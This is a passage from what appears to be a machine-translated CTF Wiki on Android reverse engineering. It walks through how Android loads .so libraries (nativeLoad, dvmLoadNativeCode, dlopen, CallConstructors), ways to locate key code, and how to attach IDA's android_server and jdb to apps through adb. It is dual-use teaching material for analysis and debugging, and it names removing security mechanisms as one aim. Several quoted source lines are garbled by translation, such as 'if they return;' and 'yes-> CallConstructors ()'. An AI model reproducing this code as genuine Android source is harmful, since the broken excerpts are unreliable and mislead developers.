appropriate path, so we can load\n\n        // libraries with no dependencies just fine, but an app that has multiple libraries that\n\n        // depend on each other needed to load them in most-dependent-first order.\n\n        // We added API to Android's dynamic linker so we can update the library path used for\n\n        // the currently-running process. We pull the desired path out of the ClassLoader here\n\n        // and pass it to nativeLoad so that it can call the private dynamic linker API.\n\n        // We didn't just change frameworks/base to update the LD_LIBRARY_PATH once at the\n\n        // beginning because multiple apks can run in the same process and third party code can\n\n        // use its own BaseDexClassLoader.\n\n        // We didn't just add a dlopen_with_custom_LD_LIBRARY_PATH call because we wanted any\n\n        // dlopen(3) calls made from a .so's JNI_OnLoad to work too.\n\n        // So, find out what the native library search path is for the ClassLoader in question...\n\n        String ldLibraryPath = null;\n\n        if (loader != null &amp;&amp; loader instanceof BaseDexClassLoader) {\n\n            ldLibraryPath = ((BaseDexClassLoader) loader).getLdLibraryPath();\n\n        }\n\n        // nativeLoad should be synchronized so there's only one LD_LIBRARY_PATH in use regardless\n\n        // of how many ClassLoaders are in the system, but dalvik doesn't support synchronized\n\n        // internal natives.\n\n        synchronized (this) {\n\n            return nativeLoad(name, loader, ldLibraryPath);\n\n        }\n\n    }\n</code></pre> <p>Although the source code is very long, many of them are comments, which explains why you should use such a function. The main reasons are as follows.</p> <ul> <li>Android apps are generated by zygote fork, so their LD_LIBRARY_PATH is zygote's LD_LIBRARY_PATH, which also means that the so files in apk are not in this path.</li> <li>There may be interdependencies between so files, we need to load them in the reverse direction of the dependencies.</li> </ul> <p>The basic idea of a function is to find the path to the library file and then call the nativeLoad function using the synchronized method.</p>"},{"location":"android/basic_operating_mechanism/native_layer/so/#nativeload","title":"nativeload","text":"<p>The nativeload function is actually a function of the native layer.</p> <pre><code>    // TODO: should be synchronized, but dalvik doesn't support synchronized internal natives.\n\n    private static native String nativeLoad(String filename, ClassLoader loader,\n\n            String ldLibraryPath);\n</code></pre> <p>The corresponding file path is <code>dalvik/vm/native/java_lang_Runtime.cpp</code>, and the specific nativeLoad function is as follows</p> <pre><code>const DalvikNativeMethod dvm_java_lang_Runtime[] = {\n\n    { \"freeMemory\",          \"()J\",\n\n        Dalvik_java_lang_Runtime_freeMemory },\n\n{&amp;quot;gc&amp;quot;, &amp;quot;() V&amp;quot;,\n        Dalvik_java_lang_Runtime_gc },\n\n{&amp;quot;maxMemory&amp;quot;, &amp;quot;() J&amp;quot;,\nDalvik_java_lang_Runtime_maxMemory},\n    { \"nativeExit\",         \"(I)V\",\n\n        Dalvik_java_lang_Runtime_nativeExit },\n\n    { \"nativeLoad\",         \"(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;)Ljava/lang/String;\",\n\n        Dalvik_java_lang_Runtime_nativeLoad },\n\n{&amp;quot;totalMemory&amp;quot;, &amp;quot;() J&amp;quot;,\n        Dalvik_java_lang_Runtime_totalMemory },\n\n{NULL, NULL, ZERO},\n};\n</code></pre> <p>It can be seen that the function corresponding to the native layer is Dalvik_java_lang_Runtime_nativeLoad, as follows</p> <pre><code>/*\n\n * static String nativeLoad(String filename, ClassLoader loader, String ldLibraryPath)\n\n *\n\n * Load the specified full path as a dynamic library filled with\n\n * JNI-compatible methods. Returns null on success, or a failure\n\n * message on failure.\n\n */\n\nstatic void Dalvik_java_lang_Runtime_nativeLoad(const u4* args,\n\nJValue * Director)\n{\n\n    StringObject* fileNameObj = (StringObject*) args[0];\n\n    Object* classLoader = (Object*) args[1];\n\n    StringObject* ldLibraryPathObj = (StringObject*) args[2];\n\n\n\n    assert(fileNameObj != NULL);\n\n    char* fileName = dvmCreateCstrFromString(fileNameObj);\n\n\n\n    if (ldLibraryPathObj != NULL) {\n\n        char* ldLibraryPath = dvmCreateCstrFromString(ldLibraryPathObj);\n\n        void* sym = dlsym(RTLD_DEFAULT, \"android_update_LD_LIBRARY_PATH\");\n\n        if (sym != NULL) {\n\n            typedef void (*Fn)(const char*);\n\n            Fn android_update_LD_LIBRARY_PATH = reinterpret_cast&lt;Fn&gt;(sym);\n\n            (*android_update_LD_LIBRARY_PATH)(ldLibraryPath);\n\n        } else {\n\n            ALOGE(\"android_update_LD_LIBRARY_PATH not found; .so dependencies will not work!\");\n\n        }\n\n        free(ldLibraryPath);\n\n    }\n\n\n\n    StringObject* result = NULL;\n\n    char* reason = NULL;\n\n    bool success = dvmLoadNativeCode(fileName, classLoader, &amp;reason);\n\n    if (!success) {\n\n        const char* msg = (reason != NULL) ? reason : \"unknown failure\";\n\n        result = dvmCreateStringFromCstr(msg);\n\n        dvmReleaseTrackedAlloc((Object*) result, NULL);\n\n    }\n\n\n\n    free(reason);\n\n    free(fileName);\n\n    RETURN_PTR(result);\n}\n</code></pre> <p>According to the comments, we can determine the key code at</p> <pre><code>    bool success = dvmLoadNativeCode(fileName, classLoader, &amp;reason);\n</code></pre> <p>After this line is executed, it will tell us whether the corresponding so is successful.</p>"},{"location":"android/basic_operating_mechanism/native_layer/so/#dvmloadnativecode","title":"dvmLoadNativeCode","text":"<p>The basic code is as follows, we can simply judge the function of the function according to the comments:</p> <ul> <li>The program loads the corresponding native code according to the specified absolute path, but if the library is already loaded, it will not be loaded again.</li> </ul> <p>Also, as stated in JNI, we can't load a library into multiple class loaders, that is, a library will only be associated with a class loader.</p> <p>The basic execution flow of the function is as follows</p> <ol> <li>Use findSharedLibEntry to determine if the library has been loaded, and if it is already loaded, is the same class loader.</li> </ol> <pre><code>/*\n\n * Load native code from the specified absolute pathname.  Per the spec,\n\n * if we've already loaded a library with the specified pathname, we\n\n * return without doing anything.\n\n *\n\n * TODO? for better results we should absolutify the pathname.  For fully\n\n * correct results we should stat to get the inode and compare that.  The\n\n * existing implementation is fine so long as everybody is using\n\n * System.loadLibrary.\n\n *\n\n * The library will be associated with the specified class loader.  The JNI\n\n * spec says we can't load the same library into more than one class loader.\n\n *\n\n * Returns \"true\" on success. On failure, sets *detail to a\n\n * human-readable description of the error or NULL if no detail is\n\n * available; ownership of the string is transferred to the caller.\n\n */\n\nbool dvmLoadNativeCode(const char* pathName, Object* classLoader,\n\n        char** detail)\n\n{\n\nSharedLib * pEntry;\n    void* handle;\n\n    bool verbose;\n\n\n\n    /* reduce noise by not chattering about system libraries */\n\n    verbose = !!strncmp(pathName, \"/system\", sizeof(\"/system\")-1);\n\n    verbose = verbose &amp;&amp; !!strncmp(pathName, \"/vendor\", sizeof(\"/vendor\")-1);\n\n\n\n    if (verbose)\n\n        ALOGD(\"Trying to load lib %s %p\", pathName, classLoader);\n\n\n\n    *detail = NULL;\n\n\n\n    /*\n\n     * See if we've already loaded it.  If we have, and the class loader\n\n     * matches, return successfully without doing anything.\n\n     */\n\npEntry = findSharedLibEntry (pathName);\nif (pEntry! = NULL) {\n        if (pEntry-&gt;classLoader != classLoader) {\n\n            ALOGW(\"Shared lib '%s' already opened by CL %p; can't open in %p\",\n\n                pathName, pEntry-&gt;classLoader, classLoader);\n\n            return false;\n\n        }\n\n        if (verbose) {\n\n            ALOGD(\"Shared lib '%s' already loaded in same CL %p\",\n\n                pathName, classLoader);\n\n        }\n\nif (! checkOnLoadResult (pEntry))\n            return false;\n\n        return true;\n\n    }\n</code></pre> <ol> <li>If it is not loaded, it will open the shared library with dlopen.</li> </ol> <pre><code>    /*\n\n     * Open the shared library.  Because we're using a full path, the system\n\n     * doesn't have to search through LD_LIBRARY_PATH.  (It may do so to\n\n     * resolve this library's dependencies though.)\n\n     *\n\n     * Failures here are expected when java.library.path has several entries\n\n     * and we have to hunt for the lib.\n\n     *\n\n     * The current version of the dynamic linker prints detailed information\n\n     * about dlopen() failures.  Some things to check if the message is\n\n     * cryptic:\n\n     *   - make sure the library exists on the device\n\n     *   - verify that the right path is being opened (the debug log message\n\n     *     above can help with that)\n\n     *   - check to see if the library is valid (e.g. not zero bytes long)\n\n     *   - check config/prelink-linux-arm.map to ensure that the library\n\n     *     is listed and is not being overrun by the previous entry (if\n\n     *     loading suddenly stops working on a prelinked library, this is\n\n     *     a good one to check)\n\n     *   - write a trivial app that calls sleep() then dlopen(), attach\n\n     *     to it with \"strace -p &lt;pid&gt;\" while it sleeps, and watch for\n\n     *     attempts to open nonexistent dependent shared libs\n\n     *\n\n     * This can execute slowly for a large library on a busy system, so we\n\n     * want to switch from RUNNING to VMWAIT while it executes.  This allows\n\n     * the GC to ignore us.\n\n     */\n\n    Thread* self = dvmThreadSelf();\n\n    ThreadStatus oldStatus = dvmChangeStatus(self, THREAD_VMWAIT);\n\n    handle = dlopen(pathName, RTLD_LAZY);\n\n    dvmChangeStatus(self, oldStatus);\n\n\n\n    if (handle == NULL) {\n\n        *detail = strdup(dlerror());\n\n        ALOGE(\"dlopen(\\\"%s\\\") failed: %s\", pathName, *detail);\n\n        return false;\n\n    }\n</code></pre> <p>The dlopen function (<code>bionic/linker/dlfcn.cpp</code>) is as follows</p> <pre><code>void* dlopen(const char* filename, int flags) {\n\n  ScopedPthreadMutexLocker locker(&amp;gDlMutex);\n\n  soinfo* result = do_dlopen(filename, flags);\n\n  if (result == NULL) {\n\n    __bionic_format_dlerror(\"dlopen failed\", linker_get_error_buffer());\n\n    return NULL;\n\n  }\n\n  return result;\n\n}\n</code></pre> <p>It will call the do_dlopen function (<code>bionic/linker/linker.cpp</code>) as follows</p> <pre><code>soinfo* do_dlopen(const char* name, int flags) {\n\n  if ((flags &amp; ~(RTLD_NOW|RTLD_LAZY|RTLD_LOCAL|RTLD_GLOBAL)) != 0) {\n\n    DL_ERR(\"invalid flags to dlopen: %x\", flags);\n\n    return NULL;\n\n  }\n\n  set_soinfo_pool_protection(PROT_READ | PROT_WRITE);\n\nSoinfo* si = find_library(name); / / determine whether there is this library, if any, need to complete the initialization work\n  if (si != NULL) {\n\nyes-&amp;gt; CallConstructors ();\n  }\n\n  set_soinfo_pool_protection(PROT_READ);\n\nif they return;\n}\n</code></pre> <p>After finding the corresponding library, <code>si-&amp;gt;CallConstructors();</code> will be used to construct the relevant information, as follows</p> <pre><code>void soinfo::CallConstructors() {\n\n  if (constructors_called) {\n\n    return;\n\n  }\n\n\n\n  // We set constructors_called before actually calling the constructors, otherwise it doesn't\n\n  // protect against recursive constructor calls. One simple example of constructor recursion\n\n  // is the libc debug malloc, which is implemented in libc_malloc_debug_leak.so:\n\n  // 1. The program depends on libc, so libc's constructor is called here.\n\n  // 2. The libc constructor calls dlopen() to load libc_malloc_debug_leak.so.\n\n  // 3. dlopen() calls the constructors on the newly created\n\n  //    soinfo for libc_malloc_debug_leak.so.\n\n  // 4. The debug .so depends on libc, so CallConstructors is\n\n  //    called again with the libc soinfo. If it doesn't trigger the early-\n\n  //    out above, the libc constructor will be called again (recursively!).\n\n  constructors_called = true;\n\n\n\n  if ((flags &amp; FLAG_EXE) == 0 &amp;&amp; preinit_array != NULL) {\n\n    // The GNU dynamic linker silently ignores these, but we warn the developer.\n\n    PRINT(\"\\\"%s\\\": ignoring %d-entry DT_PREINIT_ARRAY in shared library!\",\n\n          name, preinit_array_count);\n\n  }\n\n\n\n  if (dynamic != NULL) {\n\n    for (Elf32_Dyn* d = dynamic; d-&gt;d_tag != DT_NULL; ++d) {\n\n      if (d-&gt;d_tag == DT_NEEDED) {\n\n        const char* library_name = strtab + d-&gt;d_un.d_val;\n\n        TRACE(\"\\\"%s\\\": calling constructors in DT_NEEDED \\\"%s\\\"\", name, library_name);\n\nFind_loaded_library(library_name)-&amp;gt;CallConstructors(); //Check if the library is loaded\n      }\n\n    }\n\n  }\n\n\n\n  TRACE(\"\\\"%s\\\": calling constructors\", name);\n\n\n\n  // DT_INIT should be called before DT_INIT_ARRAY if both are present.\n\n  CallFunction(\"DT_INIT\", init_func);\n\n  CallArray(\"DT_INIT_ARRAY\", init_array, init_array_count, false);\n\n}\n</code></pre> <p>As you can see, as the comment says, if the .init function and init_array exist, the program will in turn call the code in the corresponding position in the .init function and .init_array. Related instructions are as follows</p> <pre><code>#define DT_INIT     12  /* Address of initialization function */\n\n#define DT_INIT_ARRAY   25  /* Address of initialization function array */\n</code></pre> <ol> <li>Create an open shared library entry and try to add it to the corresponding list for easy management. If the join fails, it will be released.</li> </ol> <pre><code>    /* create a new entry */\n\n    SharedLib* pNewEntry;\n\n    pNewEntry = (SharedLib*) calloc(1, sizeof(SharedLib));\n\n    pNewEntry-&gt;pathName = strdup(pathName);\n\n    pNewEntry-&gt;handle = handle;\n\n    pNewEntry-&gt;classLoader = classLoader;\n\n    dvmInitMutex(&amp;pNewEntry-&gt;onLoadLock);\n\n    pthread_cond_init(&amp;pNewEntry-&gt;onLoadCond, NULL);\n\n    pNewEntry-&gt;onLoadThreadId = self-&gt;threadId;\n\n\n\n    /* try to add it to the list */\n\nSharedLib * pActualEntry = addSharedLibEntry (pNewEntry);\n\n\nif (pNewEntry! = pActualEntry) {\n        ALOGI(\"WOW: we lost a race to add a shared lib (%s CL=%p)\",\n\n            pathName, classLoader);\n\n        freeSharedLibEntry(pNewEntry);\n\nreturn checkOnLoadResult (pActualEntry);\n    } \n</code></pre> <ol> <li>If the loading is successful, dlsym will be used to get the JNI_OnLoad function in the corresponding so file. If the function exists, it will be called. Otherwise, it will return directly.</li> </ol> <pre><code>else {\n\n        if (verbose)\n\n            ALOGD(\"Added shared lib %s %p\", pathName, classLoader);\n\n\n\n        bool result = false;\n\n        void* vonLoad;\n\n        int version;\n\n\n\n        vonLoad = dlsym(handle, \"JNI_OnLoad\");\n\n        if (vonLoad == NULL) {\n\n            ALOGD(\"No JNI_OnLoad found in %s %p, skipping init\", pathName, classLoader);\n\n            result = true;\n\n        } else {\n\n            /*\n\n             * Call JNI_OnLoad.  We have to override the current class\n\n             * loader, which will always be \"null\" since the stuff at the\n\n             * top of the stack is around Runtime.loadLibrary().  (See\n\n             * the comments in the JNI FindClass function.)\n\n             */\n            OnLoadFunc func = (OnLoadFunc)vonLoad;\n\n            Object* prevOverride = self-&gt;classLoaderOverride;\n\n\n\n            self-&gt;classLoaderOverride = classLoader;\n\n            oldStatus = dvmChangeStatus(self, THREAD_NATIVE);\n\n            if (gDvm.verboseJni) {\n\n                ALOGI(\"[Calling JNI_OnLoad for \\\"%s\\\"]\", pathName);\n\n            }\n\n            version = (*func)(gDvmJni.jniVm, NULL);\n\n            dvmChangeStatus(self, oldStatus);\n\n            self-&gt;classLoaderOverride = prevOverride;\n\n\n\n            if (version == JNI_ERR) {\n\n                *detail = strdup(StringPrintf(\"JNI_ERR returned from JNI_OnLoad in \\\"%s\\\"\",\n\n                                              pathName).c_str());\n\n            } else if (dvmIsBadJniVersion(version)) {\n\n                *detail = strdup(StringPrintf(\"Bad JNI version returned from JNI_OnLoad in \\\"%s\\\": %d\",\n\n                                              pathName, version).c_str());\n\n                /*\n\n                 * It's unwise to call dlclose() here, but we can mark it\n\n                 * as bad and ensure that future load attempts will fail.\n\n                 *\n\n                 * We don't know how far JNI_OnLoad got, so there could\n\n                 * be some partially-initialized stuff accessible through\n\n                 * newly-registered native method calls.  We could try to\n\n                 * unregister them, but that doesn't seem worthwhile.\n\n                 */\n\n            } else {\n\n                result = true;\n\n            }\n\n            if (gDvm.verboseJni) {\n\n                ALOGI(\"[Returned %s from JNI_OnLoad for \\\"%s\\\"]\",\n\n                      (result ? \"successfully\" : \"failure\"), pathName);\n\n            }\n\n        }\n\n\n\n        if (result)\n\n            pNewEntry-&gt;onLoadResult = kOnLoadOkay;\n\n        else\n\n            pNewEntry-&gt;onLoadResult = kOnLoadFailed;\n\n\n\n        pNewEntry-&gt;onLoadThreadId = 0;\n\n\n\n        /*\n\n         * Broadcast a wakeup to anybody sleeping on the condition variable.\n\n         */\n\n        dvmLockMutex(&amp;pNewEntry-&gt;onLoadLock);\n\n        pthread_cond_broadcast(&amp;pNewEntry-&gt;onLoadCond);\n\n        dvmUnlockMutex(&amp;pNewEntry-&gt;onLoadLock);\n\n        return result;\n\n    }\n\n}\n</code></pre>"},{"location":"android/basic_operating_mechanism/native_layer/so/#to-sum-up","title":"to sum up","text":"<p>This means that when the .so file is loaded, it will follow the function in the following order (if it doesn't exist, it will be skipped)</p> <ul> <li>.init function</li> <li>Functions in .init_array</li> <li>JNI_OnLoad function</li> </ul>"},{"location":"android/basic_reverse/android_code_location/","title":"Android key code positioning","text":"<p>AndroidManifest.xml file</p> <ul> <li>package name Apk main activity, hidden program without main activity</li> </ul> <p>Application is the earliest in the java layer,</p>"},{"location":"android/basic_reverse/android_code_location/#sequence-analysis","title":"Sequence Analysis","text":"<p>The most common and useful method is that we follow the logic of the program to view the code of the program for analysis, but when the program code is particularly large, the efficiency of this method is relatively low, and other methods are needed to assist.</p>"},{"location":"android/basic_reverse/android_code_location/#string-positioning-method","title":"String positioning method","text":"<p>The so-called string positioning method is to locate the corresponding function by the string that appears during the running of the program. Strings may be hard-coded directly into the program, or they may be indexed by the string id. This method is convenient to use, but now, it is possible that the string will be separated or first encrypted and decrypted dynamically during the running process.</p> <p>Strings we might be interested in may have</p> <ul> <li>Program error message</li> <li>Service</li> <li>Broadcast</li> </ul>"},{"location":"android/basic_reverse/android_code_location/#sensitive-api-positioning","title":"Sensitive API positioning","text":"<p>The so-called sensitive API positioning method means that we determine which functions the program may call based on the execution behavior of the program. This method requires us to be familiar with the API in Android. In general, we may focus on the following aspects</p> <ul> <li> <p>Control event function</p> <ul> <li> <p>onclick</p> </li> <li> <p>show</p> </li> <li> <p>Toast</p> </li> </ul> </li> <li> <p>Network function</p> <ul> <li> <p>HttpGet</p> </li> <li> <p>HttpPost</p> </li> <li> <p>HttpUriRequest</p> </li> <li> <p>socket</p> </li> </ul> </li> <li> <p>send messages</p> </li> <li>Call</li> <li>Positioning</li> <li>and many more</li> </ul>"},{"location":"android/basic_reverse/android_code_location/#log","title":"log\u4fe1\u606f","text":"<p>The so-called log information is the string information output by the Android program at runtime. This part of the information will not be reflected in our interface. Therefore, we need to use other auxiliary tools to analyze. For example, we can use ddms to assist the analysis. For log information, we can consider two aspects</p> <ul> <li>Use the log information generated by the program itself</li> <li>Decompile the code yourself, insert the log information, and repackage it for analysis.</li> </ul>"},{"location":"android/basic_reverse/android_code_location/#stack-tracking","title":"Stack Tracking","text":"<p>We can use the method provided by ddms to call the chain information to determine the current calling relationship of the program.</p>"},{"location":"android/basic_reverse/android_code_location/#hook","title":"hook","text":"<ul> <li> <p>xposed</p> </li> <li> <p>cydia</p> </li> </ul>"},{"location":"android/basic_reverse/android_code_location/#monitor","title":"monitor","text":"<ul> <li>Run log, generated by the program, generated by the system</li> <li>Thread tracing</li> <li>Method call chain</li> </ul>"},{"location":"android/basic_reverse/android_code_location/#dynamic-debugging","title":"Dynamic debugging","text":""},{"location":"android/basic_reverse/overview/","title":"Android Reverse Basic Introduction","text":"<p>First, we need to clarify the purpose of Android reverse: ** I want to analyze the function of the program**. Then we naturally have two aspects (methods and objects) that can be considered</p> <ul> <li>Analytical methods can be used in the following ways</li> <li>Static analysis, reverse the source code, then read the analysis</li> <li>Dynamic analysis, dynamic debugging of code, in general dynamic analysis is inseparable from static analysis.</li> <li>Analysis objects, generally have the following two types of objects</li> <li>java, layer code</li> <li>Native layer code</li> </ul> <p>It is not difficult to see that in order to analyze Android applications, the basic knowledge of the Java layer and the knowledge of the native layer are still necessary.</p> <p>Currently, Android reverse is mainly used in the following directions.</p> <ol> <li>app security review</li> <li>System vulnerability mining</li> <li>Malicious code killing</li> <li>Analysis of product technology principles in the same industry</li> <li>Remove security mechanisms</li> </ol>"},{"location":"android/basic_reverse/dynamic/dynamic_debug/","title":"Android dynamic debugging","text":""},{"location":"android/basic_reverse/dynamic/dynamic_debug/#android-debugging-basics","title":"Android Debugging Basics","text":"<p>In general, Android determines whether an application can be debugged according to the following order.</p> <ol> <li>Check if the ro.debuggable in boot.img is 1, and if it is 1, any application in the phone can be debugged.</li> <li>Otherwise, detect the corresponding application in AndroidManifest.xml &lt;application&gt; Whether the element contains android:debuggable=\"true\", if any, will enable debugging support.</li> </ol> <p>Naturally, we have two ways to make an application debugged.</p> <ol> <li>Unpack an apk file, at  &lt;application&gt; Add android:debuggable=\"true\" to the element, then repackage and sign.</li> <li>Modify the ro.debuggable in boot.img to 1.</li> </ol> <p>Generally speaking, because the former requires us to modify the application every time, it is more troublesome, we prefer the latter.</p> <p>For the latter, we need the root phone and brush in the relevant image. (!! Find a suitable article!!)</p> <p>In addition, the emulator generated by Andoird AVD is set to 1 by default with ro.debuggable.</p> <p>The value of <code>ro.debuggable</code> can be queried according to the following command:</p> <pre><code>adb shell getprop ro.debuggable\n</code></pre>"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#basic-debugging-tools","title":"Basic Debugging Tools","text":""},{"location":"android/basic_reverse/dynamic/dynamic_debug/#ddms","title":"DDMS","text":"<p>DDMS (Dalvik Debug Monitor Service) is the Dalvik virtual machine debugging monitoring service, which can monitor the status and results of Android programs during operation, which can greatly speed up the efficiency of our program analysis. This is a tool provided by the Android SDK, which has a device screen capture, view running thread information, file browsing, Logcat, Method Profiling, broadcast status information, analog phone calls, receiving SMS and other functions. This tool is generally located in the tools directory of the Android SDK, where ddms.bat is used to start DDMS. The more important functions in DDMS are mainly</p> <ul> <li>File browsing, we can observe and analyze the program's generation, modification, and deletion of files during execution.</li> <li>Logcat, which can output some debugging information of the software.</li> <li>Method Profiling, which tracks the execution flow of the program.</li> </ul>"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#ideaandroid-studio","title":"IDEA/Android Studio","text":"<p>Install the smaliidea plugin to dynamically debug smali.</p>"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#ida-pro","title":"IDA Pro","text":"<p>I love to crack.</p>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/","title":"IDA Dynamically Debugging Native Layer Programs","text":"<p>Here we will introduce how to debug the following types of programs.</p> <ul> <li>Basic native layer program, a simple C/C++ program.</li> <li>Native so program</li> </ul>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#essential-tools","title":"Essential Tools","text":"<ul> <li>** already rooted phone **</li> <li>IDA</li> </ul>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#fundamental","title":"Fundamental","text":"<p>When using ida to dynamically debug native layer programs, the android_server program is mainly used. The program is injected into the program to be debugged using ptrace technology.</p> <p>Each process has a status file with a field TracerPid that identifies which process the process is ptrace to. If it is not ptrace by other processes, it returns 0, otherwise it returns the pid of the corresponding process.</p>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#basic-environment-construction","title":"Basic environment construction","text":"<p>No matter what native layer program is debugged, the basic environment is similar. You need to ensure that IDA communicates with the phone normally.</p> <ol> <li>Upload the android_server file (under ida's dbgsrv folder) and modify the permissions to make it executable</li> </ol> <pre><code>adb push android_server /data/local/tmp/\n\nadb shell chmod 755 /data/local/tmp/android_server\n</code></pre> <ol> <li>Open android_server, which will listen on port 23946 (running as root)</li> </ol> <pre><code>Adb shell # Enter adb\nSu # switch root\n./data/local/tmp/android_server #Start android_server\n</code></pre> <ol> <li>Establish communication between the local computer 23496 port and the mobile phone port 23946. When the PC has a client connection to port 23946, the information it sends will be forwarded to the corresponding port on the phone, and android_server will receive the corresponding data, allowing IDA to debug the program. The port of the previous tcp refers to the port of the local PC, and the latter refers to the port of the mobile phone.</li> </ol> <pre><code>adb forward tcp:23946 tcp:23946\n</code></pre> <p>note:</p> <p>&gt; In fact, this connection establishes communication between the adb server and the adbd on the phone. So its communication is probably like this</p> <p>IDA\u2194adb server&lt;---&gt;adbd&lt;----&gt;android_server</p> <p>&gt; computer | mobile phone</p> <p>** Among them, the first step only needs to be executed once, and you don't need to execute it again later. Steps 2-3 have to be executed each time, so you can write a script and place the script's path under the system's path environment variable so that we can execute a command directly. **</p>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#basic-native-program-debugging-method-1","title":"Basic native program debugging - Method 1","text":"<p>A basic native program refers to a normal c/c++ program compiled into arm assembly.</p>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#adding-a-program","title":"Adding a program","text":"<p>Here we take the debugnativeapp in http://www.52pojie.cn/thread-554068-1-1.html as an example.</p> <p>First, we need to put the native program on the android device and modify its permissions so that it can be executed. as follows</p> <pre><code>adb push debugnativeapp /data/local/tmp/\n\nadb shell chmod 755 /data/local/tmp/debugnativeapp\n</code></pre>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#start-debugging","title":"Start debugging","text":"<p>Select the appropriate ida according to the number of bits in the native layer program, then select Debugger-Run-RemoteArmLinux/Android debugger, the following interface</p> <p></p> <p>Among them, the important parameters are as follows</p> <ul> <li> <p>Application</p> </li> <li> <p>The absolute path of the program being debugged on the phone.</p> </li> <li> <p>Directory</p> </li> <li> <p>The directory of the debugged program in the phone</p> </li> <li> <p>Hostname</p> </li> <li> <p>That is, which host we communicate with, here we communicate directly with the local PC.</p> </li> </ul> <p>The Debug options are selected as follows</p> <p></p> <p>Mainly selected three events, so that our program can be automatically stopped at the entry point, when the thread starts, when the library is loaded. Of course, you can also choose.</p> <p>After starting the program, as follows</p> <p></p> <p>Note:</p> <p>&gt; 1. If you find that you can not load plugin, it may be that the phone does not have root.</p> <p>&gt; 2. If you encounter the following problems, just cancel it. The specific reasons are not clear.</p> <p></p> <p>&gt; 3. If you encounter error: only position independent executables (PIE) are supported. Generally because the version of android phone is greater than 5, you can try</p> <p>&gt; - Use the PIE version of android_server &gt; - Use 010Editor to change the e_type in the elf header field in the header of the executable ELF file to ET_DYN(3).</p>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#so-native-program-debugging","title":"so native program debugging","text":"<p>For so native programs, we might wonder what is different from ordinary native programs? Naturally there are, so files cannot be run separately. Usually some other programs call some basic functions in the so file. So here we can't directly use the above run method. In general, the so files in android are dependent on the apk file.</p> <p>Here we take debugjniso.apk in http://www.52pojie.cn/thread-554068-1-1.html as an example.</p> <p>** First, you must build a basic debugging environment. **</p>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#installer","title":"Installer","text":"<p>First, we need to install the apk on the phone.</p> <pre><code>adb install debugjniso.apk\n</code></pre>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#debug-mode-startup-app","title":"Debug mode startup app","text":"<p>Secondly, we need to start the program in ** debug mode**, so that IDA can easily capture the corresponding program and attach it.</p> <p>```shell</p> <p>adb shell am start -D -n packagename/.MainActivity</p> <p>```</p>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#attach-program","title":"attach program","text":"<p>Start IDA pro, click Debugger-Attach-RemoteArmLinux/Android debugger, Hostname fills in localhost, port defaults to port 23946. In fact, it is the listening port of our local computer. as follows</p> <p></p> <p>Click ok to start debugging</p> <p>note:</p> <p>&gt; If only one program /bin/sh can be attached at the end, it means that the android_server program is not running with root privileges.</p> <p>Use ctrl+f to quickly locate and select the corresponding process, as follows</p> <p></p> <p>Then ok OK.</p> <p>At this point we can see that we have attached success.</p> <p></p> <p>At this time, we click Debugger-Debugger options again, and the related options are as follows:</p> <p></p> <p>The meaning is similar to the native program.</p> <p>&gt; Why do you choose to set the corresponding breakpoint at this time? Because if you set it at the beginning of the attach, there is actually no such thing here. Everyone can try.</p>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#resume-app-execution","title":"Resume app execution","text":"<p>At this time, the interface of the app is wait for debugger, and we have attached it. At this time, you need to let the program continue to run.</p> <p>First, we open ddms to select the process we want to debug.</p> <p></p> <p>This is actually equivalent to direct execution.</p> <pre><code># Display all user processes available for debugging on the phone\nadb jdwp\n\n# Establish a connection between the xxx port of the PC and the corresponding port of the mobile phone to facilitate communication\nadb forward tcp:xxx jdwp:&lt;pid&gt;\n</code></pre> <p>The reason why we don't use the command to execute is because we have to determine the process number of our apk ourselves, which is more troublesome.</p> <p>Here is a basic communication process</p> <p></p> <p>At this point, our computer has established communication with the app's app virtual machine.</p> <p>At the same time, we need to use jdb in the java layer to attach our apk application to our computer, here we use the following command.</p> <pre><code>jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=xxx\n</code></pre> <p>Where xxx is the 8700 port we saw in ddms, the default is this. After execution</p> <pre><code>C:\\Users\\iromise\n\n\u03bb jdb.bat\n\n\njdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700\n\nSet uncaught java.lang.Throwable\nSet delayed uncaught java.lang.Throwable\nInitializing jdb...\n&gt;\n</code></pre> <p>Let\u2019s take a look at our mobile phone again.</p> <p></p> <p>At this point, the application has continued to run, no longer the previous wait for debugger.</p>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#determining-the-native-function-address","title":"Determining the native function address","text":"<p>Here we open an ida again, import the sok of the apk, and then look for our function in export, as follows</p> <p></p> <p>It can be seen that the offset is 0xc38.</p> <p>We then run F9 in the previous debug IDA until it is no longer running, we will see the program break at the linker</p> <p></p> <p>At this point, we ** click on the app's interface to set the title button ** (the reason to press this, because the native API is called in the function), observe the IDA again, you can see that the so library has been loaded into</p> <pre><code>B3B05000: loaded /data/app/com.droider.debugjniso-1/oat/arm/base.odex\n\nB39B9000: loaded /system/lib/hw/gralloc.msm8974.so\n\nB39B2000: loaded /system/lib/libmemalloc.so\n\nB39AA000: loaded /system/lib/libqdutils.so\n\nB3B00000: loaded /data/app/com.droider.debugjniso-1/lib/arm/libdebugjniso.so\n</code></pre> <p>At this point, we use ctrl+s to locate 0xB3B00000 at the starting address of the library. Then according to</p> <pre><code>Absolute address = base address + relative offset\n</code></pre> <p>Get the address of the jnistring.</p>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#observation-results","title":"Observation results","text":"<p>Press g, then type <code>+0xC38</code> and click ok to jump to the function</p> <pre><code>libdebugjniso.so:B3B00C38 Java_com_droider_debugjniso_TestJniMethods_jniString\nlibdebugjniso.so:B3B00C38 LDR             R1, =(unk_B3B02148 - 